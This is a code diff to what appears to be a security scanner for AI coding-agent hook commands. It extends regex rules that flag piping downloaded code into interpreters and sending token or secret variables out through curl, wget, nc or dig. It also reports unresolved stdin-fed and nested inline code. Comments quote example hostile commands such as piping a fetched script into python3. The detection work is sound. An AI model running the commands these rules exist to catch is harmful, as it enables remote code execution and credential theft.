@@ -1715,7 +1715,11 @@ SHELL_SYNTAX = re.compile(r"[$`*?\[]")
 # in it is a path we resolved.
 SUBSTITUTION = re.compile(r"\$\(|`")
 HOOK_RULES: list[tuple[str, str, re.Pattern]] = [
-    ("H1", "block", re.compile(r"(?:curl|wget)[^|\n]{0,200}\|\s*(?:sudo\s+)?(?:sh|bash|zsh)")),
+    # Every interpreter, not three shells: `curl -s https://host/p | python3` is the same shape and
+    # H1 did not match it. hook_scripts reports the stdin gap too, so this is the second of two.
+    ("H1", "block", re.compile(r"(?:curl|wget)[^|\n]{0,200}\|\s*(?:sudo\s+)?"
+                               r"(?:sh|bash|zsh|fish|dash|ksh|python[\d.]*|pypy[\d.]*|node(?:js)?[\d.]*"
+                               r"|deno|bun|ruby[\d.]*|perl[\d.]*|php[\d.]*|tsx|ts-node|lua)\b")),
     ("H2", "block", re.compile(r"(?:printenv|\benv\b|\$[A-Z_]*(?:TOKEN|SECRET|KEY|PASSWORD)[A-Z_]*)"
                                r"[^\n]{0,120}?(?:\|[^\n]{0,60})?\b(?:curl|wget|nc|ncat|dig|nslookup)\b")),
     ("H2", "block", re.compile(r"\b(?:curl|wget)\b[^\n]{0,200}\$[A-Z_]*(?:TOKEN|SECRET|KEY|PASSWORD)")),
@@ -1782,6 +1786,11 @@ INLINE_BY_FAMILY: list[tuple[re.Pattern, tuple[str, ...]]] = [
     (re.compile(r"tsx|ts-node|lua|luajit|Rscript|osascript|env|uv|uvx|pipx|npx|bunx|npm|pnpm|yarn"), ()),
 ]
 SCRIPT_EXT = re.compile(r"\.(?:py|mjs|cjs|js|ts|sh)$")
+# These run a package script or hand over to the next program; they do not run a file themselves,
+# so they are program names for resolution but never the reason for an H11 gap — otherwise every
+# `pnpm build` hook earned a finding with nothing behind it. A real interpreter later in the
+# segment (`env python3 x`, `pnpm exec node x`) raises it on its own.
+DELEGATES = re.compile(r"npm|pnpm|yarn|npx|bunx|uv|uvx|pipx|env")
 # Spaced operators only: `shlex.split("a;b")` returns one token, so this is a floor, not a fence.
 SEPARATORS = {"&&", "||", ";", "|", "&", ";;", "(", ")"}
 
@@ -1807,7 +1816,12 @@ def hook_scripts(root: Path, command: str, _depth: int = 0) -> tuple[list[Path],
     for form in ('"${CLAUDE_PROJECT_DIR}"', "${CLAUDE_PROJECT_DIR}", '"$CLAUDE_PROJECT_DIR"', "$CLAUDE_PROJECT_DIR"):
         expanded = expanded.replace(form, str(root))
     try:
-        tokens = shlex.split(expanded, posix=True) if expanded.strip() else []
+        # `shlex.split` does not know operators: `a;b` is one token, and a token that is half a
+        # path and half the next command is neither — it was dropped in silence. punctuation_chars
+        # splits `;`, `&`, `|`, `<`, `>` and parentheses out, which SEPARATORS below already reads.
+        lex = shlex.shlex(expanded, posix=True, punctuation_chars=True)
+        lex.whitespace_split = True
+        tokens = list(lex) if expanded.strip() else []
     except ValueError:            # an unbalanced quote: fall back to whitespace, never to silence
         tokens = expanded.split()
     # `$HOME/bin/tool.sh` is ordinary and a reader can judge it; a command that COMPUTES what it
@@ -1837,6 +1851,24 @@ def hook_scripts(root: Path, command: str, _depth: int = 0) -> tuple[list[Path],
         return "/" in token or bool(SCRIPT_EXT.search(token)) or (root / token).is_file()
 
     interp, resolved, inline, code_next, cur_flags, piped = False, False, False, None, (), False
+
+    def close_segment() -> None:
+        """What this command segment left unaccounted for.
+
+        An interpreter fed on **stdin** reads code nobody reviewed: `curl -s https://host/p |
+        python3` resolved nothing and said nothing, because H1 only ever matched a pipe into
+        `sh|bash|zsh`. Suppressing the gap after a pipe — written one commit before this one, to
+        keep a test tidy — was the same control regression the H9 comment above warns about, and
+        it removed the last finding that caught the shape. So a pipe makes it worse, not quieter."""
+        if not interp or resolved or inline:
+            return
+        if piped:
+            unresolved.append((f"stdin into `{Path(tokens[0]).name if tokens else 'a shell'}` — "
+                               f"code from the command before it: `{command.strip()[:80]}`", "computed"))
+        else:
+            # A command that names an interpreter and resolved nothing is not an inline command and
+            # not a reviewed script: it is a gap, and a gap says so rather than passing quietly.
+            unresolved.append((f"no file resolved in `{command.strip()[:80]}`", "no-script"))
     for token in tokens:
         if code_next is not None:
             # The token after an inline flag IS the code. Reading it as a path invented
@@ -1846,27 +1878,39 @@ def hook_scripts(root: Path, command: str, _depth: int = 0) -> tuple[list[Path],
                 sub_out, sub_un = hook_scripts(root, token, _depth + 1)
                 here = root.resolve()
                 for q in sub_out:
-                    if not (q.is_file() and q.resolve().is_relative_to(here)):
-                        continue  # an argument, not a script: inside a quoted string we require both
-                    if q.as_posix() not in seen:
-                        seen.add(q.as_posix())
-                        out.append(q)
+                    if q.is_file() and q.resolve().is_relative_to(here):
+                        if q.as_posix() not in seen:
+                            seen.add(q.as_posix())
+                            out.append(q)
                         resolved = True
-                unresolved.extend(u for u in sub_un if u[1] != "no-script")
+                    elif SCRIPT_EXT.search(q.name):
+                        # Inside a quoted string we require a readable file here, because `rm -rf
+                        # /tmp/x` otherwise reads an argument as a script. But dropping the rest in
+                        # silence hid `bash -c 'python3 /tmp/evil.py'`, so anything that looks like
+                        # a script and is not one of ours is reported instead of dropped.
+                        unresolved.append((f"{q} — named inside inline code, not a file in this project",
+                                           "expansion"))
+                        resolved = True
+                unresolved.extend(sub_un)
+            else:
+                # The depth limit is a limit, not a verdict: `bash -c "bash -c '…'"` resolved
+                # nothing and said nothing.
+                unresolved.append((f"inline code nested inside inline code: `{token[:80]}`", "computed"))
+                resolved = True
             code_next = None
             continue
         if token in SEPARATORS:                      # a new command: its own program, its own gap
-            if interp and not resolved and not inline and not piped:
-                unresolved.append((f"no file resolved in `{command.strip()[:80]}`", "no-script"))
+            close_segment()
             interp, resolved, inline, cur_flags = False, False, False, ()
-            piped = token == "|"                     # `curl … | sh` feeds the shell on stdin
+            piped = token == "|"
             continue
         if token in cur_flags:                       # THIS program's inline flag: code follows
             code_next, inline = token, True
             continue
         flags = inline_flags(Path(token).name)
         if flags is not None and "/" not in token:   # a bare program name, not a file
-            interp, cur_flags = True, flags
+            cur_flags = flags
+            interp = interp or not DELEGATES.fullmatch(Path(token).name)
             continue
         if token.startswith("-"):
             # An option, or its value, which `is_path` below declines on its own: `-W ignore`,
@@ -1881,10 +1925,7 @@ def hook_scripts(root: Path, command: str, _depth: int = 0) -> tuple[list[Path],
             continue
         if is_path(token):
             resolved = add(token) or resolved
-    if interp and not resolved and not inline and not piped:
-        # A command that names an interpreter and resolved nothing is not an inline command and not
-        # a reviewed script: it is a gap, and a gap says so rather than passing quietly.
-        unresolved.append((f"no file resolved in `{command.strip()[:80]}`", "no-script"))
+    close_segment()
     return out, unresolved
 
 
